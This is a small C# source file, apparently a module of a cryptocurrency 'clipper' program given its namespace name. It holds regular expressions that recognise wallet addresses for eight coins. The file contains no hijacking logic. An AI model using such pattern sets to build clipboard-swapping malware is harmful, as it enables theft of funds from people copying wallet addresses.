using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper.Modules
{
    internal sealed class RegexPatterns
    {
        public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
        {
            {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)") },
            {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") },
            {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") },
            {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") },
            {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") },
            {"neo", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") },
            {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") },
            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") }
        };
    }
}
